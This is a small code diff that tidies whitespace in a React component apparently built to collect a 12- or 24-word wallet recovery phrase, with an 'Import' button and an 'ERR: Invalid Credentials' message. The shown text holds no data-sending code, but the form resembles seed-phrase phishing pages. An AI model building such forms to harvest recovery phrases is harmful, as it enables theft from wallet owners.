@@ -54,9 +54,7 @@ const Phrase = () => {
             </a>
           </div>
         </div>
-
         <hr />
-
         {hide ? (
           <div className="errordiv">
             <h3>ERR: Invalid Credentials</h3>
@@ -74,8 +72,7 @@ const Phrase = () => {
             Typically 12(sometimes 24) words separated by single spaces
           </h6>
           <button type="submit" onClick={Showmodal}>
-            {" "}
-            <b>Import</b>{" "}
+            <b>Import</b>
           </button>
 
         </form>
